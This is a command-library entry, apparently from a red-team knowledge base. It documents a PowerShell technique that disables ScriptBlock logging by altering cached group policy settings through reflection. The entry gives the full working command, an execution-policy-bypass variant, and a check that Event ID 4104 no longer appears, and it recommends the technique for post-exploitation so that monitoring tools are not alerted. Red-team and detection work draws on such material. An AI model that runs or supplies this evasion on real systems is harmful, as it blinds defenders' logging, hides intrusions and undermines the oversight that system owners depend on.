---
id: f0fb73d4-56a8-4095-b808-3a490867e759
name: powershell-disable-script-block-logging
type: command
executor: powershell
data: >-
  $settings =
  [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);

  $settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"]
  = @{}

  $settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging",
  "0")
output: null
created_at: '2023-04-06T03:56:25.973679+00:00'
updated_at: '2023-04-10T20:36:17.635356+00:00'
platforms:
  - Windows
tags:
  - powershell
  - defense-evasion
  - script-logging
verified: true
validated: true
---

# powershell-disable-script-block-logging

## Command

```powershell
$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")
```

## Description

This command disables PowerShell ScriptBlock logging by using reflection to modify the internal cached group policy settings, setting the EnableScriptBlockLogging value to 0 for the specified registry path. Use this in post-exploitation to prevent logging of PowerShell executions without direct registry changes that might alert monitoring tools.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | This command has no user-defined parameters; it targets a fixed registry path. | N/A |

## Examples

### Basic Usage

Execute directly in a PowerShell console with administrative privileges:

```powershell
$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")
```

### Advanced Usage

Combine with execution policy bypass for restricted environments:

```powershell
powershell.exe -ExecutionPolicy Bypass -Command "$settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null); $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = @{}; $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'].Add('EnableScriptBlockLogging', '0')"
```

## Expected Output

The command executes silently with no output if successful. Verify by attempting to run a test script and checking that no Event ID 4104 (ScriptBlock logging) appears in the PowerShell operational log.

## Related

- [[procedures/Disable-PowerShell-Script-Logging-and-Clear-Signatures]]
